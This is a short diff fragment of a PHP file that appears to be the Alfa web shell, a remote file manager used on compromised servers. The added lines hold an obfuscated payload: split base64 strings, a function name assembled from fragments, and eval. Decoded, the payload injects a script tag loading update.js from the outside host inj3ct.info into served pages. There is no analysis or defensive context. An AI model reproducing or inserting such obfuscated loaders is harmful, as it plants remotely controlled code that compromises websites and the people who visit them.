@@ -8243,4 +8243,10 @@ Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" sty
                     if (empty($_POST['a'])) if (isset($default_action) && function_exists('alfa' . $default_action)) $_POST['a'] = $default_action;
                     else $_POST['a'] = 'FilesMan';
                     if (!empty($_POST['a']) && function_exists('alfa' . $_POST['a'])) call_user_func('alfa' . $_POST['a']);
-                    exit; ?>
+                    exit; 
+$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL2luaj";
+$winr = "NjdC5pbmZvL3VwZGF0ZS5qcz48L1NDUklQVD4iOw==";
+$min = 'base' . (128 / 2) . '_de' . 'code';
+eval($min($linr . $winr));
+
+?>
